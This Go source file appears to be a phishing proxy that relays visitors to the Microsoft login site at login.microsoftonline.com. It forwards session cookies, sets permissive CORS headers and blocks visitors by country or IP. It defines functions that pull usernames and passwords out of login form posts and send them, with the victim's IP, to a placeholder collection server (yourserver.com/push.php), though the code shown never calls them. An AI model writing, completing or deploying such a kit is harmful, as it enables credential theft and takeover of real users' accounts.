package main

import (
    "bytes"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strings"
)

const (
    upstream        = "https://login.microsoftonline.com"
    upstreamPath    = "/"
    serverURL       = "https://yourserver.com/push.php"
)

var (
    blockedRegions = []string{}
    blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
)

func main() {
    port := os.Getenv("PORT")
    if port == "" {
        port = "8080" // Default to port 8080 if not set
        fmt.Println("PORT environment variable not set, defaulting to 8080")
    }

    http.HandleFunc("/", handleRequest)
    fmt.Printf("Starting proxy server on port %s...\n", port)
    if err := http.ListenAndServe("0.0.0.0:"+port, nil); err != nil {
        fmt.Printf("Error starting server: %v\n", err)
        os.Exit(1)
    }
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
    region := r.Header.Get("cf-ipcountry")
    ipAddress := r.Header.Get("cf-connecting-ip")

    if isBlocked(region, ipAddress) {
        http.Error(w, "Access denied.", http.StatusForbidden)
        return
    }

    // Handle preflight OPTIONS request for CORS
    if r.Method == http.MethodOptions {
        handlePreflight(w, r)
        return
    }

    upstreamURL := upstream + upstreamPath + r.URL.Path
    req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
    if err != nil {
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    // Copy headers, ensuring _bssoConfig cookie is unaltered
    copyHeadersWithCookies(r.Header, req.Header)

    req.Header.Set("Host", "login.microsoftonline.com")
    req.Header.Set("Referer", r.Referer())

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        http.Error(w, "Error contacting upstream server", http.StatusInternalServerError)
        return
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    bodyString := string(body)

    // Ensure _bssoConfig cookie remains unaltered in response
    copyHeadersWithCookies(resp.Header, w.Header())

    // Add CORS headers to the response
    addCORSHeaders(w, r)

    // Add or update the Content-Security-Policy header to allow specific scripts
    addCSPHeaders(w)

    w.WriteHeader(resp.StatusCode)
    w.Write([]byte(bodyString))
}

// Handle preflight OPTIONS request
func handlePreflight(w http.ResponseWriter, r *http.Request) {
    addCORSHeaders(w, r)
    w.WriteHeader(http.StatusOK)
}

// Add CORS headers to the response
func addCORSHeaders(w http.ResponseWriter, r *http.Request) {
    origin := r.Header.Get("Origin")
    if origin != "" {
        w.Header().Set("Access-Control-Allow-Origin", origin)
    } else {
        w.Header().Set("Access-Control-Allow-Origin", "*")
    }
    w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
    w.Header().Set("Access-Control-Allow-Headers", r.Header.Get("Access-Control-Request-Headers"))
    w.Header().Set("Access-Control-Allow-Credentials", "true")
}

// Add or modify CSP headers
func addCSPHeaders(w http.ResponseWriter) {
    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; base-uri 'self';")
}

// copyHeadersWithCookies ensures that the _bssoConfig cookie is copied without alteration
func copyHeadersWithCookies(src http.Header, dst http.Header) {
    for k, v := range src {
        for _, vv := range v {
            if k == "Cookie" || k == "Set-Cookie" {
                if strings.Contains(vv, "_bssoConfig") {
                    dst.Add(k, vv)
                }
            } else {
                dst.Add(k, vv)
            }
        }
    }
}

func isBlocked(region, ipAddress string) bool {
    for _, blockedRegion := range blockedRegions {
        if strings.EqualFold(blockedRegion, region) {
            return true
        }
    }
    for _, blockedIP := range blockedIPs {
        if blockedIP == ipAddress {
            return true
        }
    }
    return false
}

func extractCredentials(r *http.Request) (string, string) {
    bodyBytes, err := ioutil.ReadAll(r.Body)
    if err != nil {
        return "", ""
    }

    bodyString := string(bodyBytes)
    r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))

    username := extractValueFromBody(bodyString, "login")
    password := extractValueFromBody(bodyString, "passwd")

    return username, password
}

func extractValueFromBody(body, key string) string {
    params := strings.Split(body, "&")
    for _, param := range params {
        pair := strings.SplitN(param, "=", 2)
        if len(pair) == 2 && pair[0] == key {
            return pair[1]
        }
    }
    return ""
}

func sendToServer(data, ipAddress string) {
    payload := fmt.Sprintf(`{"data": "%s", "ip": "%s"}`, data, ipAddress)
    _, err := http.Post(serverURL, "application/json", strings.NewReader(payload))
    if err != nil {
        fmt.Println("Failed to send data to server:", err)
    }
}
